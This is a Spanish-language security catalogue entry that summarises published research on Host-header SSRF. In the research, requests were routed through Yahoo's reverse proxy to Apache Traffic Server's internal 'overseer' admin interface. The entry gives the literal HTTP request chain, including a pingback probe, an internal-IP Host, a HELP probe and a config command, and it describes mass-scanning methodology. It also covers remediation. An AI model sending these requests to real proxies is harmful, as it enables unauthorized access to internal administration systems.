---
clase: ssrf
tech: apache-traffic-server
cwe: CWE-918
cvss: 9.1 # [derivado] recompensa de $15,000 segun la fuente; acceso a interfaz de administracion interna
payload: |
  # ADVERTENCIA (H1): el render colapso los saltos de linea; las corridas de 3 espacios
  # marcan donde estaban. Estructura reconstruida.
  #
  # PASO 1 - sonda de pingback. LITERAL de la fuente:
  GET / HTTP/1.1
  Host: uniqid.burpcollaborator.net
  Connection: close
  #
  # Cita LITERAL de la fuente sobre su metodologia: 'All the findings presented in this
  # paper started with a pingback'.
  #
  # PASO 2 - apuntar a un sistema INTERNO. LITERAL de la fuente (la IP viene redactada
  # en el original como XX.X.XXX.XX):
  GET / HTTP/1.1
  Host: XX.X.XXX.XX:8082
  #
  # PASO 3 - la interfaz 'overseer' de Apache Traffic Server responde a HELP:
  HELP / HTTP/1.1
  Host: XX.X.XXX.XX:8082
  #
  # PASO 4 - GET con cuerpo estilo POST que lleva un comando. LITERAL de la fuente:
  GET / HTTP/1.1
  Host: XX.X.XXX.XX:8082
  Content-Length: 34

  GET proxy.config.alarm_email
  #
  # NOTA DE FIDELIDAD: el cuerpo 'GET proxy.config.alarm_email' son 28 caracteres, no
  # los 34 que declara el Content-Length. La discrepancia esta en la fuente; no la
  # corrijo. El SET de ejemplo que muestra la fuente
  # (proxy.config.alarm_email = "nobody@yahoo-inc.com") aparece como TEXTO DE RESPUESTA,
  # no como peticion.
  #
  # Host afectado nombrado por la fuente: ats-vm.lorax.bf1.yahoo.com
precondicion: "Un proxy inverso que enruta la peticion al host indicado en la cabecera Host, sin restringirlo. Con eso, el atacante alcanza cualquier sistema que el proxy pueda ver — incluida la interfaz de administracion 'overseer' de Apache Traffic Server en el puerto 8082, que no esta pensada para ser alcanzable desde fuera."
como_se_descubre: |
  Metodologia del paper, en dos piezas:
  1. ESCUCHAR. Enviar payloads que provoquen una llamada saliente y correlacionarla.
     Herramienta: Collaborator Everywhere, extension de Burp que —LITERAL— 'injects
     payloads containing unique identifiers into all proxied traffic, and uses these to
     automatically correlate pingbacks'. La fuente indica que 'roughly half the
     vulnerabilities disclosed in this paper were found using it'.
  2. ESCALAR. Con ZMap/ZGrab sobre los datos FDNS de Project Sonar de Rapid7,
     prefijando cada payload con el hostname del objetivo
     (example.com.collaboratorid.burpcollaborator.net) para saber quien respondio.
  ADVERTENCIA de reproducibilidad, LITERAL de la fuente: una de las vulnerabilidades
  de Yahoo tenia 'only a 30% chance of being found on any given scan' porque el DNS
  round-robin repartia las peticiones entre tres frontends. Un escaneo negativo NO es
  prueba de ausencia.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: Host: uniqid.burpcollaborator.net -> llega interaccion al Collaborator
  # B: Host: el hostname legitimo         -> respuesta normal del sitio
  # C: Host: una IP interna (RFC1918 o la del objetivo) + puerto
  #    -> si responde algo DISTINTO de la aplicacion publica, se alcanzo un sistema
  #       interno. El 'HELP' del paso 3 es el control perfecto: una interfaz que
  #       responde a HELP con su propia ayuda se identifica a si misma.
  # El paso C con HELP es un control excepcionalmente limpio: no hay que adivinar que
  # servicio hay detras, el servicio lo dice.
mata: |
  - El proxy valida el Host contra una allowlist y no enruta por el.
  - Segmentacion de red que impida al proxy ver los sistemas internos. Es la unica
    remediacion que da el paper (ver abajo).
  - El puerto 8082 (overseer de ATS) no esta abierto o no es alcanzable.
  - Escaneo negativo con balanceo DNS: repetir. Ver advertencia del 30%.
fuente: "https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface (James Kettle, publicado 2017-07-27, act. 2025-09-03). Peticiones y host literales. Recompensa LITERAL: $15,000 ('received a $15,000 payout'), la mayor del paper. Total del paper: 'a healthy $33,000'. SIN CVE en todo el articulo. La discrepancia del Content-Length es de la fuente."
confianza: media
fecha: 2026-11-02
---
# [SSRF] Enrutado por cabecera `Host` en Yahoo — la interfaz *overseer* de Apache Traffic Server ($15.000)

## Principio
Un proxy inverso que decide a dónde reenviar leyendo la cabecera `Host` convierte esa
cabecera en un selector de destino. El paper lo describe como *"an extra-powerful variant
of Server-Side Request Forgery"*, y la razón de la potencia es la posición de red: un
proxy de borde ve sistemas internos que ningún atacante externo alcanza.

## La cadena
Sonda inicial:

```http
GET / HTTP/1.1
Host: uniqid.burpcollaborator.net
Connection: close
```

Apuntar a un sistema interno (la IP viene redactada en el original):

```http
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
```

Y el paso que identifica qué hay detrás:

```http
HELP / HTTP/1.1
Host: XX.X.XXX.XX:8082
```

Era la interfaz **overseer** de Apache Traffic Server, que acepta comandos. Enviados como
cuerpo de un `GET`:

```http
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
Content-Length: 34

GET proxy.config.alarm_email
```

## El control más limpio de todo el catálogo
Enviar `HELP` a un puerto desconocido y recibir su propia ayuda. No hay que adivinar qué
servicio hay detrás: **el servicio se identifica a sí mismo**. Cuando una SSRF alcanza un
puerto interno, probar los verbos de administración genéricos (`HELP`, `STATS`, `INFO`,
`VERSION`) antes de construir cualquier payload es la forma más rápida de saber contra
qué se está trabajando.

## Nota de fidelidad
El cuerpo `GET proxy.config.alarm_email` son 28 caracteres, no los 34 que declara el
`Content-Length`. La discrepancia está en la fuente y no la corrijo. El `SET` de ejemplo
que muestra el artículo aparece como **texto de respuesta**, no como petición.

## La advertencia de reproducibilidad
Literal de la fuente: una de las vulnerabilidades de Yahoo tenía *"only a 30% chance of
being found on any given scan"*, porque el DNS round-robin repartía las peticiones entre
tres frontends y solo uno era vulnerable.

Es un dato operativo de primer orden: **un escaneo negativo no es prueba de ausencia**
cuando hay balanceo. Repetir no es insistir por cabezonería, es necesario para cubrir el
pool.

## Impacto
Acceso a la interfaz de administración del Traffic Server de Yahoo, con capacidad de leer
y escribir su configuración. Recompensa: **$15.000**, la mayor del paper.

Corrección a una creencia extendida: este paper suele citarse por pagos enormes, y el
total real que declara es *"a healthy $33,000"* repartido en cuatro hallazgos de Yahoo
($15.000 + $5.000 + $5.000 + $8.000). No hay ningún CVE en todo el artículo.

## Remediación
La única que da el paper, literal:

> *"To achieve any semblance of defense in depth, reverse proxies should be firewalled
> into a hardened DMZ, isolated from anything that isn't publicly accessible."*

Merece notarse que el paper **no** propone validar el `Host` como remedio principal, sino
asumir que el proxy será engañado y limitar lo que puede alcanzar. Es una postura de
contención, no de validación — y es la correcta para una clase donde el vector reaparece
con cada nueva forma de ambigüedad en la URL.
